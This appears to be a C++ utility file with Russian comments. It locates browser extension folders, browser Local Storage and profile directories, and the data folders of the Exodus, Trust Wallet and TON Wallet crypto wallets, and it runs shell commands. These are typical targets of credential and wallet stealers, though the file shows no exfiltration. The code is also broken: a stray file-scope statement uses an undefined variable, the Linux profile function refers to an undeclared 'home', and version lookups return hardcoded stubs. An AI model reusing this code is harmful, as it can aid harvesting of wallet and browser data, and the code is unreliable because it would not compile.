#include "utils/platform_utils.h"
#include "internal/logging.h"
#include <filesystem>
#include <fstream>
#include <sstream>
#include <array>
#include <memory>

#if defined(_WIN32)
    #include <windows.h>
    #include <shlobj.h>
#elif defined(__APPLE__) || defined(__linux__)
    #include <unistd.h>
    #include <sys/types.h>
    #include <pwd.h>
#endif

namespace mceas {
namespace utils {

std::string GetHomeDir() {
#if defined(_WIN32)
    char path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, path))) {
        return std::string(path);
    }
    
    char* homeDrive = getenv("HOMEDRIVE");
    char* homePath = getenv("HOMEPATH");
    if (homeDrive && homePath) {
        return std::string(homeDrive) + std::string(homePath);
    }
    
    return "";
#else
    const char* home = getenv("HOME");
    if (home) {
        return std::string(home);
    }
    
    struct passwd* pw = getpwuid(getuid());
    if (pw) {
        return std::string(pw->pw_dir);
    }
    
    return "";
#endif
}

std::string GetAppDataDir() {
#if defined(_WIN32)
    char path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path))) {
        return std::string(path);
    }
    return "";
#elif defined(__APPLE__)
    std::string home = GetHomeDir();
    if (!home.empty()) {
        return home + "/Library/Application Support";
    }
    return "";
#elif defined(__linux__)
    std::string home = GetHomeDir();
    if (!home.empty()) {
        return home + "/.config";
    }
    return "";
#else
    return "";
#endif
}

std::string GetLocalAppDataDir() {
#if defined(_WIN32)
    char path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
        return std::string(path);
    }
    return "";
#elif defined(__APPLE__)
    return GetAppDataDir(); // На macOS нет отдельной локальной директории
#elif defined(__linux__)
    std::string home = GetHomeDir();
    if (!home.empty()) {
        return home + "/.local/share";
    }
    return "";
#else
    return "";
#endif
}

std::string GetProgramFilesDir() {
#if defined(_WIN32)
    char path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILES, NULL, 0, path))) {
        return std::string(path);
    }
    return "";
#elif defined(__APPLE__)
    return "/Applications";
#elif defined(__linux__)
    return "/usr/bin";
#else
    return "";
#endif
}

std::string GetTempDir() {
#if defined(_WIN32)
    char path[MAX_PATH];
    DWORD length = GetTempPathA(MAX_PATH, path);
    if (length > 0) {
        return std::string(path);
    }
    return "";
#else
    return "/tmp";
#endif
}

std::string GetExtensionPath(const std::string& browser, const std::string& extension_id) {
    std::string base;
    std::string home = GetHomeDir();
    
    if (home.empty()) {
        LogError("Failed to get home directory");
        return "";
    }

#if defined(_WIN32)
    if (browser == "Chrome") {
        base = GetLocalAppDataDir() + "\\Google\\Chrome\\User Data\\Default\\Extensions\\";
    } else if (browser == "Edge") {
        base = GetLocalAppDataDir() + "\\Microsoft\\Edge\\User Data\\Default\\Extensions\\";
    } else if (browser == "Firefox") {
        // Firefox на Windows хранит расширения иначе
        LogInfo("Firefox extension path on Windows is not fully implemented yet");
        return "";
    }
#elif defined(__APPLE__)
    if (browser == "Chrome") {
        base = GetAppDataDir() + "/Google/Chrome/Default/Extensions/";
    } else if (browser == "Edge") {
        base = GetAppDataDir() + "/Microsoft Edge/Default/Extensions/";
    } else if (browser == "Firefox") {
        // Firefox на macOS хранит расширения иначе
        LogInfo("Firefox extension path on macOS is not fully implemented yet");
        return "";
    }
#elif defined(__linux__)
    if (browser == "Chrome") {
        base = GetAppDataDir() + "/google-chrome/Default/Extensions/";
    } else if (browser == "Edge") {
        base = GetAppDataDir() + "/microsoft-edge/Default/Extensions/";
    } else if (browser == "Firefox") {
        // Firefox на Linux хранит расширения иначе
        LogInfo("Firefox extension path on Linux is not fully implemented yet");
        return "";
    }
#endif
    else {
        LogWarning("Unsupported browser: " + browser);
        return "";
    }

    return base + extension_id;
}

std::string GetBrowserStoragePath(const std::string& browser) {
    std::string home = GetHomeDir();
    
    if (home.empty()) {
        LogError("Failed to get home directory");
        return "";
    }

#if defined(_WIN32)
    if (browser == "Chrome") {
        return GetLocalAppDataDir() + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\";
    } else if (browser == "Edge") {
        return GetLocalAppDataDir() + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\";
    }
#elif defined(__APPLE__)
    if (browser == "Chrome") {
        return GetAppDataDir() + "/Google/Chrome/Default/Local Storage/leveldb/";
    } else if (browser == "Edge") {
        return GetAppDataDir() + "/Microsoft Edge/Default/Local Storage/leveldb/";
    }
#elif defined(__linux__)
    if (browser == "Chrome") {
        return GetAppDataDir() + "/google-chrome/Default/Local Storage/leveldb/";
    } else if (browser == "Edge") {
        return GetAppDataDir() + "/microsoft-edge/Default/Local Storage/leveldb/";
    }
#endif

    LogWarning("Unsupported browser storage path: " + browser);
    return "";
}

std::string GetBrowserProfileDir(const std::string& browser_name) {
#if defined(_WIN32)
    std::string appdata = GetLocalAppDataDir();
    if (browser_name == "Chrome") {
        return appdata + "\\Google\\Chrome\\User Data\\Default";
    } else if (browser_name == "Firefox") {
        std::string mozilla_dir = GetAppDataDir() + "\\Mozilla\\Firefox";
        // Для Firefox нужно найти файл profiles.ini и прочитать путь к профилю
        // Здесь для простоты возвращаем примерный путь
        return mozilla_dir + "\\Profiles\\default";
    } else if (browser_name == "Edge") {
        return appdata + "\\Microsoft\\Edge\\User Data\\Default";
    }
#elif defined(__APPLE__)
    std::string appdata = GetAppDataDir();
    if (browser_name == "Chrome") {
        return appdata + "/Google/Chrome/Default";
    } else if (browser_name == "Firefox") {
        // Для Firefox нужно найти профиль по умолчанию
        std::string mozilla_dir = appdata + "/Firefox/Profiles";
        // В идеале здесь должен быть код для поиска профиля с .default в имени
        return mozilla_dir;
    } else if (browser_name == "Edge") {
        return appdata + "/Microsoft Edge/Default";
    }
#elif defined(__linux__)
    std::string config = GetAppDataDir();
    if (browser_name == "Chrome") {
        return config + "/google-chrome/Default";
    } else if (browser_name == "Firefox") {
        // Для Firefox нужно найти профиль по умолчанию
        std::string mozilla_dir = home + "/.mozilla/firefox";
        // В идеале здесь должен быть код для поиска профиля с .default в имени
        return mozilla_dir;
    } else if (browser_name == "Edge") {
        return config + "/microsoft-edge/Default";
    }
#endif
    return "";
}

std::string GetAppPath(const std::string& app_name) {
#if defined(_WIN32)
    // На Windows проверяем Program Files и Program Files (x86)
    std::vector<std::string> program_dirs = {
        GetProgramFilesDir() + "\\",
        GetProgramFilesDir() + " (x86)\\"
    };
    
    for (const auto& dir : program_dirs) {
        std::string app_path = dir + app_name;
        if (FileExists(app_path)) {
            return app_path;
        }
        
        // Проверяем с расширением .exe
        app_path = dir + app_name + "\\";
        if (FileExists(app_path)) {
            return app_path;
        }
        
        app_path = dir + app_name + "\\" + app_name + ".exe";
        if (FileExists(app_path)) {
            return app_path;
        }
    }
#elif defined(__APPLE__)
    // Проверяем стандартные директории для приложений
    std::vector<std::string> app_dirs = {
        GetProgramFilesDir() + "/",
        "/Applications/Utilities/",
        GetHomeDir() + "/Applications/"
    };
    
    for (const auto& dir : app_dirs) {
        std::string app_path = dir + app_name + ".app";
        if (FileExists(app_path)) {
            return app_path;
        }
    }
#elif defined(__linux__)
    // На Linux проверяем несколько стандартных путей
    std::vector<std::string> app_dirs = {
        GetProgramFilesDir() + "/",
        "/usr/local/bin/",
        "/opt/"
    };
    
    for (const auto& dir : app_dirs) {
        std::string app_path = dir + app_name;
        if (FileExists(app_path)) {
            return app_path;
        }
        
        // Проверяем с заглавной буквы
        std::string capitalized = app_name;
        if (!capitalized.empty()) {
            capitalized[0] = std::toupper(capitalized[0]);
        }
        app_path = dir + capitalized;
        if (FileExists(app_path)) {
            return app_path;
        }
    }
#endif

    return "";
}

std::string GetBrowserExecutablePath(const std::string& browser_name) {
#if defined(_WIN32)
    std::string program_files = GetProgramFilesDir();
    if (browser_name == "Chrome") {
        return program_files + "\\Google\\Chrome\\Application\\chrome.exe";
    } else if (browser_name == "Firefox") {
        return program_files + "\\Mozilla Firefox\\firefox.exe";
    } else if (browser_name == "Edge") {
        return program_files + "\\Microsoft\\Edge\\Application\\msedge.exe";
    }
#elif defined(__APPLE__)
    if (browser_name == "Chrome") {
        return "/Applications/Google Chrome.app";
    } else if (browser_name == "Firefox") {
        return "/Applications/Firefox.app";
    } else if (browser_name == "Edge") {
        return "/Applications/Microsoft Edge.app";
    }
#elif defined(__linux__)
    if (browser_name == "Chrome") {
        return "/usr/bin/google-chrome";
    } else if (browser_name == "Firefox") {
        return "/usr/bin/firefox";
    } else if (browser_name == "Edge") {
        return "/usr/bin/microsoft-edge";
    }
#endif
    return "";
}

std::string GetAppDataPath(const std::string& app_name) {
    std::string app_data = GetAppDataDir();
    
    if (app_data.empty()) {
        LogError("Failed to get app data directory");
        return "";
    }

#if defined(_WIN32)
    if (app_name == "Exodus") {
        return app_data + "\\Exodus";
    } else if (app_name == "Trust Wallet") {
        return app_data + "\\Trust Wallet";
    } else if (app_name == "TON Wallet") {
        return app_data + "\\TON Wallet";
    }
#elif defined(__APPLE__)
    if (app_name == "Exodus") {
        return app_data + "/Exodus";
    } else if (app_name == "Trust Wallet") {
        return app_data + "/Trust Wallet";
    } else if (app_name == "TON Wallet") {
        return app_data + "/TON Wallet";
    }
#elif defined(__linux__)
    if (app_name == "Exodus") {
        return app_data + "/exodus";
    } else if (app_name == "Trust Wallet") {
        return app_data + "/trust-wallet";
    } else if (app_name == "TON Wallet") {
        return app_data + "/ton-wallet";
    }
#endif

    LogWarning("Unknown app data path for: " + app_name);
    return "";
}

bool FileExists(const std::string& path) {
    return !path.empty() && std::filesystem::exists(path);
}

bool IsAppInstalled(const std::string& app_name) {
    // Сначала проверяем путь к приложению
    std::string app_path = GetAppPath(app_name);
    if (!app_path.empty()) {
        return true;
    }
    
    // Затем проверяем путь к данным приложения
    std::string data_path = GetAppDataPath(app_name);
    return !data_path.empty() && FileExists(data_path);
}

bool IsBrowserInstalled(const std::string& browser_name) {
    std::string path = GetBrowserExecutablePath(browser_name);
    return !path.empty() && FileExists(path);
}

bool IsBrowserExtensionInstalled(const std::string& browser, const std::string& extension_id) {
    std::string extension_path = GetExtensionPath(browser, extension_id);
    return !extension_path.empty() && FileExists(extension_path);
}

std::string GetAppVersion(const std::string& app_name) {
#if defined(_WIN32)
    // На Windows можно получить версию через атрибуты файла
    std::string app_path = GetAppPath(app_name);
    if (app_path.empty()) {
        return "";
    }
    
    // Находим исполняемый файл
    if (app_path.find(".exe") == std::string::npos) {
        if (FileExists(app_path + "\\" + app_name + ".exe")) {
            app_path = app_path + "\\" + app_name + ".exe";
        } else {
            // Ищем любой .exe файл в директории
            try {
                for (const auto& entry : std::filesystem::directory_iterator(app_path)) {
                    if (entry.path().extension() == ".exe") {
                        app_path = entry.path().string();
                        break;
                    }
                }
            }
            catch (const std::exception& e) {
                LogError("Error finding executable in directory: " + std::string(e.what()));
            }
        }
    }
    
    // Заглушка: в реальном коде здесь должно быть получение версии через WinAPI
    // Например, через функции GetFileVersionInfo и VerQueryValue
    return "1.0.0";
#elif defined(__APPLE__)
    std::string app_path = GetAppPath(app_name);
    if (app_path.empty()) {
        return "";
    }
    
    // Путь к Info.plist в пакете приложения
    std::string plist_path = app_path + "/Contents/Info.plist";
    
    if (!FileExists(plist_path)) {
        LogWarning("Info.plist not found: " + plist_path);
        return "";
    }
    
    // Используем defaults для чтения значения из plist
    std::string command = "/usr/bin/defaults read \"" + plist_path + "\" CFBundleShortVersionString";
    return ExecuteCommand(command);
#elif defined(__linux__)
    // На Linux получаем версию через команду
    std::string command;
    
    if (app_name == "Chrome" || app_name == "Google Chrome") {
        command = "google-chrome --version";
    } else if (app_name == "Firefox") {
        command = "firefox --version";
    } else if (app_name == "Edge" || app_name == "Microsoft Edge") {
        command = "microsoft-edge --version";
    } else {
        // Для других приложений пытаемся использовать опцию --version
        std::string app_path = GetAppPath(app_name);
        if (!app_path.empty()) {
            command = "\"" + app_path + "\" --version";
        }
    }
    
    if (!command.empty()) {
        std::string result = ExecuteCommand(command);
        // Извлекаем номер версии из результата
        // Обычно версия в формате "X.Y.Z" находится в конце строки
        size_t pos = result.find_last_of("0123456789");
        if (pos != std::string::npos) {
            size_t start_pos = result.find_last_not_of("0123456789.", pos);
            if (start_pos != std::string::npos) {
                return result.substr(start_pos + 1, pos - start_pos);
            }
        }
    }
    
    return "1.0.0"; // Заглушка, если не удалось извлечь версию
#else
    return "";
#endif
}
std::string command = "defaults read /Applications/Google\\ Chrome.app/Contents/Info.plist " + version_key;

std::string GetBrowserVersion(const std::string& browser_name, const std::string& version_key = "CFBundleShortVersionString") {
    return GetAppVersion(browser_name);
}

std::string GetExtensionVersion(const std::string& browser, const std::string& extension_id) {
    std::string extension_path = GetExtensionPath(browser, extension_id);
    if (extension_path.empty() || !FileExists(extension_path)) {
        return "";
    }
    
    // Ищем последнюю версию расширения (самую новую директорию)
    std::string latest_version = "";
    if (std::filesystem::is_directory(extension_path)) {
        for (const auto& entry : std::filesystem::directory_iterator(extension_path)) {
            if (entry.is_directory()) {
                latest_version = entry.path().filename().string();
            }
        }
    }
    
    if (latest_version.empty()) {
        return "";
    }
    
    // Читаем manifest.json для получения версии
    std::string manifest_path;
#if defined(_WIN32)
    manifest_path = extension_path + "\\" + latest_version + "\\manifest.json";
#else
    manifest_path = extension_path + "/" + latest_version + "/manifest.json";
#endif

    if (!FileExists(manifest_path)) {
        return "";
    }
    
    try {
        std::ifstream file(manifest_path);
        if (!file.is_open()) {
            return "";
        }
        
        std::stringstream buffer;
        buffer << file.rdbuf();
        file.close();
        
        // Простой парсинг для поиска строки версии
        std::string content = buffer.str();
        size_t version_pos = content.find("\"version\"");
        if (version_pos == std::string::npos) {
            return "";
        }
        
        size_t colon_pos = content.find(":", version_pos);
        if (colon_pos == std::string::npos) {
            return "";
        }
        
        size_t quote1_pos = content.find("\"", colon_pos + 1);
        if (quote1_pos == std::string::npos) {
            return "";
        }
        
        size_t quote2_pos = content.find("\"", quote1_pos + 1);
        if (quote2_pos == std::string::npos) {
            return "";
        }
        
        return content.substr(quote1_pos + 1, quote2_pos - quote1_pos - 1);
    }
    catch (const std::exception& e) {
        LogError("Error reading extension manifest: " + std::string(e.what()));
        return "";
    }
}

std::string ExecuteCommand(const std::string& command) {
#if defined(_WIN32)
    // На Windows используем CreateProcess и ReadFile
    HANDLE hReadPipe = NULL, hWritePipe = NULL;
    SECURITY_ATTRIBUTES sa;
    PROCESS_INFORMATION pi;
    STARTUPINFOA si;
    
    // Подготовка структур
    ZeroMemory(&sa, sizeof(sa));
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    
    // Создание анонимного pipe
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        LogError("Failed to create pipe for command execution");
        return "";
    }
    
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    
    ZeroMemory(&pi, sizeof(pi));
    
    // Создание процесса
    if (!CreateProcessA(NULL, const_cast<LPSTR>(command.c_str()), NULL, NULL, TRUE, 
                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        LogError("Failed to create process for command execution");
        return "";
    }
    
    // Закрытие ненужных хэндлов
    CloseHandle(hWritePipe);
    
    // Чтение вывода
    std::string result;
    char buffer[4096];
    DWORD bytesRead;
    
    while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        result += buffer;
    }
    
    // Закрытие хэндлов
    CloseHandle(hReadPipe);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    // Очистка результата
    result.erase(0, result.find_first_not_of(" \n\r\t"));
    size_t last_non_whitespace = result.find_last_not_of(" \n\r\t");
    if (last_non_whitespace != std::string::npos) {
        result.erase(last_non_whitespace + 1);
    }
    
    return result;
#else
    // Для Unix-систем используем popen
    std::array<char, 128> buffer;
    std::string result;
    
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(command.c_str(), "r"), pclose);
    if (!pipe) {
        LogError("Failed to execute command: " + command);
        return "";
    }
    
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    
    // Удаляем лишние пробелы и переносы строк
    result.erase(0, result.find_first_not_of(" \n\r\t"));
    size_t last_non_whitespace = result.find_last_not_of(" \n\r\t");
    if (last_non_whitespace != std::string::npos) {
        result.erase(last_non_whitespace + 1);
    }
    
    return result;
#endif
}

} // namespace utils
} // namespace mceas